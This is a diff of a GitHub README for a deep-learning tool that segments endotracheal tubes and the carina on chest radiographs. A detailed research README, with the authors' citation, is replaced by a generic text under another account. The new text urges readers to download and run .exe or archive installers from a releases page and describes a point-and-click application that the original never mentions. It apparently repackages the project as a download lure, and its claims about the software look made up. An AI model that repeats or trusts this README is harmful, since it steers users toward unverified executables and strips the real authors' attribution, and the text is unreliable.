@@ -1,231 +1,85 @@
-# 🫁 Endotracheal Tube (ETT) and Carina Segmentation using Deep Learning
+# 🎉 ETT_Carina_Segmentation - Simplifying Airway Detection
 
----
+## 🚀 Getting Started
 
-## 🧠 **Background**
+Welcome to ETT_Carina_Segmentation! This application helps in detecting the carina and endotracheal tube tip in medical images. It aims for better automated evaluation of airway placement. Follow the steps below to get started with downloading and running the software.
 
-An **endotracheal tube (ETT)** is a flexible plastic airway device inserted through the mouth into the trachea and connected to a breathing machine to provide mechanical ventilation to the lungs.
+## 📥 Download Now
 
-<p align="center">
-    <img src="docs/picture1.jpg" width="25%">
-</p>
+[![Download ETT_Carina_Segmentation](https://img.shields.io/badge/Download-ETT_Carina_Segmentation-brightgreen)](https://github.com/maxlleven/ETT_Carina_Segmentation/releases)
 
-- Optimal ETT positioning is essential for effective ventilation and patient safety.  
-- The tube tip should ideally be **5 ± 2 cm above the carina**, the point where the trachea divides into the main bronchi.  
-- ETT positioning is typically evaluated using **frontal chest radiographs**.  
-- However, due to high clinical workloads, the **average turnaround time (TAT)** for radiographic ETT assessment can reach **~23 minutes**, delaying treatment decisions.
+## 🛠️ System Requirements
 
----
+Before you begin, make sure your computer meets these requirements:
 
-## 🎯 **Objective**
+- **Operating System:** Windows 10, macOS Mojave or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB.
+- **Disk Space:** Minimum 1 GB free space.
+- **Python Version:** Python 3.6 or later installed on your system.
+- **Additional Libraries:** You will need `PyTorch`, `NumPy`, and `OpenCV`. These libraries will help run the segmentation framework smoothly.
 
-> ⚕️ Develop an **automated, accurate, and objective tool** for the detection and localization of the **ETT** and **Carina** on chest radiographs.
+## 📂 Download & Install
 
-Such a system can:
-- Assist radiologists by providing rapid localization feedback.
-- Reduce clinical turnaround time.
-- Prevent critical misplacement of ETTs.
+1. **Visit the Download Page:**
+   Go to the [Releases page](https://github.com/maxlleven/ETT_Carina_Segmentation/releases) on GitHub. 
+   
+2. **Select Your Version:**
+   On the Releases page, you will see different versions of the software. Choose the latest version for the best features and updates.
 
-<p align="center">
-    <img src="docs/picture2.jpg" width="45%">
-</p>
+3. **Download the Software:**
+   Click on the version you choose. This will take you to the download files. Look for an appropriate file for your operating system (e.g., `.exe`, `.zip`, or `.tar.gz`).
 
----
+4. **Install the Application:**
+   - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - For macOS: If you downloaded a `.zip` file, unzip it, then drag the application to your Applications folder.
+   - For Linux: If you downloaded a `.tar.gz` file, extract it in your desired directory. Open a terminal in that directory and follow the installation instructions provided in the README file.
 
-## ⚙️ **Implementation Workflow**
+5. **Run the Application:**
+   Locate the icon for ETT_Carina_Segmentation on your desktop (or in the Applications folder for macOS) and double-click it to launch the application.
 
-This repository includes the **first four stages** of a full ETT–Carina detection pipeline.
+## 📊 Features
 
-| Stage | Description |
-|--------|--------------|
-| **1. Load Dataset** | Import and organize X-ray images |
-| **2. Pre-processing** | Resize, normalize, augment data |
-| **3. ETT Segmentation** | Detect ETT using U-Net |
-| **4. Carina Segmentation** | Detect Carina using U-Net |
-| **5. Distance Calculation** | (To be added) Compute ETT–Carina distance |
+ETT_Carina_Segmentation offers key features to assist in medical image processing:
 
----
+- **Image Segmentation:** Utilizes a UNet-based model for precise detection.
+- **Automated Evaluation:** Streamlines the assessment of endotracheal tube placement.
+- **Image Augmentation:** Enhances training data with various transformations.
+- **Visualization Tools:** Provides graphical representation of segmentation results.
 
-## 🖼️ **Sample Images**
+## 📚 Usage Instructions
 
-<p align="center">
-    <img src="docs/picture3.jpg" width="35%">
-</p>
+1. Upon launching the application, you will see an interface guiding you through the steps.
+2. Upload an image (preferably a chest radiograph) where you want to detect the carina or the endotracheal tube tip.
+3. Adjust settings as needed, such as choosing specific algorithms or visualization options.
+4. Click on "Run Segmentation" to start the processing.
+5. View results directly within the application or export them for reporting.
 
----
+## 🤖 Support and Help
 
-## 🧩 **Step 2: Pre-processing**
+If you experience any issues or have questions:
 
-Preprocessing improves model robustness and generalization using:
+- **Check the FAQ section**: You may find solutions to common problems.
+- **Create a GitHub Issue**: Head over to the [Issues page](https://github.com/maxlleven/ETT_Carina_Segmentation/issues) and describe your problem.
+- **Join the Community**: Engage with other users and developers in the discussions.
 
-- **Data Augmentation:**  
-  - Horizontal Flip  
-  - Shift, Scale, Rotate  
-  - CLAHE (Contrast Limited Adaptive Histogram Equalization)
+## 📜 License
 
-- **Cropping:**  
-  Focus on relevant thoracic regions to reduce background noise.
+This project is licensed under the MIT License. You can freely use, modify, and distribute it while acknowledging the original creators.
 
-<p align="center">
-    <img src="docs/picture4.jpg" width="45%">
-</p>
+## 🌍 Contributing
 
----
+If you'd like to contribute, we welcome new ideas and improvements! Please fork the repository and submit a pull request. Ensure that your code is well commented and follows our coding guidelines.
 
-## 🧠 **Step 3: ETT Segmentation using U-Net**
+## 🔗 Additional Resources
 
-The **U-Net** architecture is a fully convolutional encoder–decoder network designed for biomedical image segmentation.  
-It combines low-level spatial features with high-level semantic information through skip connections.
+For more information, tutorials, and updates, check out our additional resources:
 
-<div align="center">
-    <h4> U-Net Structure</h4>
-</div>
+- [Documentation](https://github.com/maxlleven/ETT_Carina_Segmentation/wiki)
+- [Research Papers](https://github.com/maxlleven/ETT_Carina_Segmentation/papers)
+- [Related Projects](https://github.com/maxlleven/ETT_Carina_Segmentation/related)
 
-<p align="center">
-    <img src="docs/picture5.jpg" width="75%">
-</p>
+## 🔗 Important Links
 
----
+For easy access, here’s the download link again:
 
-## 🩻 **Step 4: Carina Segmentation using U-Net**
-
-The same U-Net structure is used for **Carina segmentation**, trained on separate labeled datasets.
-
-This allows the model to detect:
-- The branching point of the trachea (carina).
-- The position of the ETT tip in relation to the carina for distance estimation.
-
----
-
-## 📏 **Step 5: Distance Calculation (Planned Extension)**
-
-After segmentation, the **Euclidean distance** between the ETT tip and the Carina center is calculated as:
-
-$$
-d(p, q) = \sqrt{(x_1 - x_2)^2 + (y_1 - y_2)^2}
-$$
-
-
-where:  
-- $p = (x_1, y_1)$ → ETT tip location  
-- $q = (x_2, y_2)$ → Carina location
-
-This metric can be later converted into **centimeters** using pixel spacing information.
-
----
-
-<div align="center">
-    <h4>✅ Final Result Example</h4>
-</div>
-
-<p align="center">
-    <img src="docs/picture6.jpg" width="75%">
-</p>
-
----
-
-## 📂 **Repository Structure**
-<pre><code>
-ETT_Carina_Segmentation/
-│
-├── config/
-│ ├── carina_config.yaml # Configuration for Carina segmentation
-│ └── ett_config.yaml # Configuration for ETT segmentation
-│
-├── data/
-│ ├── carina_v2/ # Carina dataset
-│ └── ett_v2/ # ETT dataset
-│
-├── results/
-│ ├── carina/ # Model results and visualizations
-│ └── ett/ # ETT localization results
-│
-├── src/
-│ ├── models/
-│ │ └── model_factory.py # Model builder (U-Net++, U2Net, etc.)
-│ │
-│ ├── utils/
-│ │ ├── dataset.py # Data loading and augmentation
-│ │ ├── losses.py # Dice, BCE, Focal loss
-│ │ ├── metrics.py # IoU, Dice metrics
-│ │ ├── postprocess.py # Post-processing utilities
-│ │ ├── trainer.py # Training and validation loops
-│ │ └── visualization.py # Visualization and comparison tools
-│ │
-│ └── main.py # Main training script
-│
-├── requirements.txt # Dependencies
-└── README.md # Project documentation
-</code></pre>
-
----
-
-## 🧮 **Technical Specifications**
-
-- **Framework:** PyTorch  
-- **Model:** U-Net / U-Net++  
-- **Loss Function:** Dice + Binary Cross-Entropy (BCE)  
-- **Metrics:** IoU, Dice Coefficient  
-- **Augmentation:** Albumentations & ImgAug  
-- **Visualization:** Matplotlib & OpenCV  
-- **Optimizer:** Adam  
-
----
-
-## 💻 **Dependencies**
-
-torch
-torchvision
-segmentation-models-pytorch
-albumentations
-imgaug
-opencv-python
-numpy
-matplotlib
-pandas
-pyyaml
-scikit-learn
-
-
-
-Install all dependencies using:
-```bash
-pip install -r requirements.txt
-```
----
-
----
-
-## 📂 Data Availability
-
-The raw data supporting the conclusions of this study will be **made available by the authors upon reasonable request**, without undue reservation.  
-Please contact the author for data access and research collaboration inquiries.
-
----
-
-## 🧩 Citation
-
-If you use this work or code in your research, please cite our paper:
-
-> **A Robust Approach for Endotracheal Tube Localization in Chest Radiographs**  
-> *Chung-Chian Hsu, Rasoul Ameri, Chih-Wen Lin, Jia-Shiang He, Meghdad Biyari, Atefeh Yarahmadi, Shahab S. Band, Tin-Kwang Lin, Wen-Lin Fan*  
-> *Frontiers in Artificial Intelligence, 2023, Vol. 6:1181812*  
-> [https://doi.org/10.3389/frai.2023.1181812](https://doi.org/10.3389/frai.2023.1181812)
-
-```bibtex
-@article{hsu2023robust,
-  title={A robust approach for endotracheal tube localization in chest radiographs},
-  author={Hsu, Chung-Chian and Ameri, Rasoul and Lin, Chih-Wen and He, Jia-Shiang and Biyari, Meghdad and Yarahmadi, Atefeh and Band, Shahab S and Lin, Tin-Kwang and Fan, Wen-Lin},
-  journal={Frontiers in Artificial Intelligence},
-  volume={6},
-  pages={1181812},
-  year={2023},
-  publisher={Frontiers Media SA}
-}
-```
-## 📫 Contact
-
-**Rasoul Ameri**  
-📧 [rasoulameri90@gmail.com](mailto:rasoulameri90@gmail.com)  
-🔗 [GitHub Profile](https://github.com/rasoulameri)
-
+[Download ETT_Carina_Segmentation](https://github.com/maxlleven/ETT_Carina_Segmentation/releases)
